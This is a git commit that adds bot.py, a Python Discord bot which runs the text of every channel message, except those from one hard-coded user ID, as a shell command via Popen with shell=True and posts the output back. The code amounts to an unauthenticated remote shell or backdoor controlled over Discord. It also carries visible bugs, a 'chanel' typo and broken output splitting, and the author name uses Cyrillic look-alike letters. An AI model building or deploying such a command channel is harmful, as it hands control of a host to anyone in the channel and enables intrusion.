90d2dd7adf0f80bd0458d9a7b76c7a5dfec849b6
Nikоlаy Dimitrov <73880661+ngdimitrov@users.noreply.github.com>
2025-11-12 12:44:49 +0200

    Add files via upload

---
+++ bot.py
@@ -0,0 +1,49 @@
+import discord
+from subprocess import PIPE, Popen
+
+token = ''
+
+
+intents = discord.Intents.default()
+intents.message_content = True
+
+client = discord.Client(intents=intents)
+
+@client.event
+async def on_ready():
+    print(f'We have logged in as {client.user}')
+
+@client.event
+async def on_message(message):
+    try:  
+        if message.author.id == 1438092622186151967:
+            return
+    
+        print(str(message.content))
+        cmdOutput = cmdline(str(message.content))
+        encoding = 'utf-8'
+        cmdOutput = cmdOutput.decode(encoding)
+        cmdOutputBuffer = cmdOutput
+        if(len(cmdOutput) > 1999):
+            while(len(cmdOutputBuffer) > 1999):
+                cmdOutputBuffer = cmdOutputBuffer[:len(cmdOutputBuffer)//2]
+                await message.chanel.send(cmdOutputBuffer)
+        else:
+            await message.channel.send(cmdOutput)
+            print(cmdOutput)
+
+    except Exception as e:
+        await message.channel.send("I encountered errors,could not execute command.")
+        print(e)
+
+def cmdline(command):
+    process = Popen(
+        args=command,
+        stdout=PIPE,
+        shell=True
+    )
+
+    return process.communicate()[0]
+
+client.run(token)
+
